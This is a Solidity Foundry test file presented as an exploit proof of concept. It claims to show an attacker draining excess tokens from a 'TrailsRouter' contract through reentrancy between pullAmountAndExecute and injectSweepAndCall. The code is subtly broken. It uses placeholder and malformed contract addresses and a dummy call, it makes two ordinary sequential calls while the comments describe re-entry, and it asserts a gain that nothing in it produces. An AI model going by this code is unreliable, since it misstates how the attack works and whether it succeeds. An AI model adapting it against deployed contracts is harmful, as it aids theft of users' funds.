// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITrailsRouter {
    function pullAmountAndExecute(address token, uint256 amount, bytes calldata data) external payable returns (bytes[] memory);
    function injectSweepAndCall(address token, address target, bytes calldata callData, uint256 amountOffset, bytes32 placeholder) external payable;
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    ITrailsRouter trailsRouter;
    IERC20 token;
    address attacker;
    address victim;
    uint256 initialAttackerBalance;
    uint256 initialVictimBalance;

    function setUp() public {
        // Deploy or fork contracts
        // Assume trailsRouter and token are already deployed and addresses are known
        trailsRouter = ITrailsRouter(0x1234567890abcdef1234567890abcdef12345678);
        token = IERC20(0xabcdefabcdefabcdefabcdefabcdefabcdefabcdef);

        // Set initial state
        attacker = address(0x1);
        victim = address(0x2);

        // Fund accounts
        deal(address(token), attacker, 1000 ether);
        deal(address(token), victim, 1000 ether);

        initialAttackerBalance = token.balanceOf(attacker);
        initialVictimBalance = token.balanceOf(victim);
    }

    function test_exploit() public {
        // Step 1: Attacker calls pullAmountAndExecute with a token and amount
        bytes memory data = abi.encodeWithSignature("someFunction()");
        vm.prank(attacker);
        trailsRouter.pullAmountAndExecute(address(token), 100 ether, data);

        // Step 2: During the transfer, the attacker re-enters the contract via _injectAndExecuteCall
        vm.prank(attacker);
        trailsRouter.injectSweepAndCall(address(token), address(this), data, 0, bytes32(0));

        // Step 3: Assert that the attacker extracted more than entitled
        uint256 finalAttackerBalance = token.balanceOf(attacker);
        assertGt(finalAttackerBalance, initialAttackerBalance);

        // Assert that the victim's balance is unchanged
        uint256 finalVictimBalance = token.balanceOf(victim);
        assertEq(finalVictimBalance, initialVictimBalance);
    }
}